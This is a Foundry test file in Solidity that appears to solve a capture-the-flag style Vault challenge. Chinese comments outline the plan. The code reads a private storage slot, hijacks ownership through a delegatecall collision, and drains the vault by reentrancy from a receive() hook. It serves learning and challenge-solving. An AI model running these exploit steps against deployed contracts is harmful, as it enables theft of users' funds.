// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {VaultLogic,Vault} from "./Vault.sol";
/**
思路: 
    可以重入攻击, 但是vault关闭提取就无法攻击
    如果能解决修改owner那就可以为所欲为

    1. 虽然是private, 但是还是可以通过插槽去读取, 使用assmebly?
    2. 注意的是, 并不是EOA发起攻击, 而是合约, 所以需要设置player = address(this),
       因为合约可以写fallback或者receive来重复调取withDraw
 */
contract VaultExploiter is Test {
    VaultLogic vaultLogic;
    Vault vault;
    address owner = makeAddr("owner");
    bool start_attack;
    address player = address(this);

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.startPrank(owner);
            bytes32 password = bytes32("0x98765433456");
            vaultLogic = new VaultLogic(password);
            vault = new Vault(address(vaultLogic));
            vault.deposite{ value: 0.1 ether }();
        vm.stopPrank();
    }
    function test_owner() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);
            console.log(player);
            address logicAddress = address(uint160(uint256(vm.load(address(vault), bytes32(uint256(1))))));
            callChangeOwner(vault, bytes32(uint256(uint160(address(logicAddress)))), player);
            
            // 判断是否成功修改owner
            assertEq(vault.owner(), player);

            // 开始攻击
            vault.openWithdraw();
            start_attack = true;
            vault.deposite{ value: 0.01 ether }();

            console2.log("vault balance before attack:", address(vault).balance);

            vault.withdraw();

            console2.log("vault balance after attack:", address(vault).balance);

            require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
    function callChangeOwner(Vault vault1, bytes32 password, address newOwner) public {
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", password, newOwner);
        (bool success,) = address(vault1).call(data);
        require(success, "changeOwner call failed");
    }

    receive() external payable {
        if (start_attack) {
            console.log("-------attacked ------");
            // start_attack = false;
            vault.withdraw();
        }
    }
}